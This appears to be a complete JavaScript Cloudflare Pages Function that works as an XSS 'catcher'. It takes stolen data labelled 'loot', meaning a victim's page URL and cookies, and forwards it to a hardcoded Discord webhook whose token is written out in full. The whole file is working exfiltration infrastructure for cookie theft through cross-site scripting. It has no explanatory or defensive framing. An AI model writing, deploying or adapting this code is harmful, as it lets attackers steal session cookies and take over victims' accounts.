export async function onRequestPost(context) {
    try {
        const loot = await context.request.json();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1488396759217606778/pRWuYwEBHnrDJf4TEL1OP-pcKV2vfNkAm-w9BSYK4OHXHjrjq2zsD2nDcX7tbeEVO07e";
        
        // Truncate cookies/html to ensure we stay under the 2000 char limit
        const safeCookies = String(loot.cookies).substring(0, 1000);
        
        const discordMessage = {
            username: "Cloudflare XSS Catcher",
            content: `🚨 **XSS HIT!** 🚨\n**URL:** ${loot.url}\n**Cookies:**\n\`\`\`text\n${safeCookies}\n\`\`\``
        };

        const response = await fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordMessage)
        });

        return new Response(JSON.stringify({ status: "delivered", discord: response.status }), {
            status: 200,
            headers: { "Content-Type": "application/json" }
        });

    } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), { status: 400 });
    }
}
